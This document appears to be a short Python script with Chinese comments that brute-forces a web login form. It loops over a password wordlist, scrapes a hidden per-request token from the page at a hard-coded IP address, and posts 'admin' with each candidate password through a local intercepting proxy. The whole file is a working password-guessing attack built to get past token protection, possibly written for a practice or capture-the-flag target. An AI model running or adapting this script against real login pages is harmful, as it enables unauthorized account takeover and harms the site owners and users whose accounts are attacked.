
import urllib
import re
from bs4 import BeautifulSoup
from distutils.filelist import findall

import requests

gets = open("C:/Users/Elliot/Desktop/python_req_crack/simple.txt","r").read().splitlines()

host = "http://119.29.175.97/c/hdyzma/"

s = requests.session()


for get in gets:
    contents = s.get(host,proxies={'http': 'http://127.0.0.1:8080'}).content
    soup = BeautifulSoup(contents, "html.parser")
# soup的用法
    token = soup.find('input', style='display:none')['value']

    #print(token)


#for line in f.readlines():

    print(get)
   # print(line)

#这里用法 是  find后面一个参数是标签，然后找到特殊的字符‘style=none’，最后获取其中的value值


    url = host+'welcome.php'
    d = {'name': 'admin','password':get,'token':token }
    r = s.post(url, data=d,proxies={'http': 'http://127.0.0.1:8080'})
    r.encoding = 'UTF-8'
    print(r.text)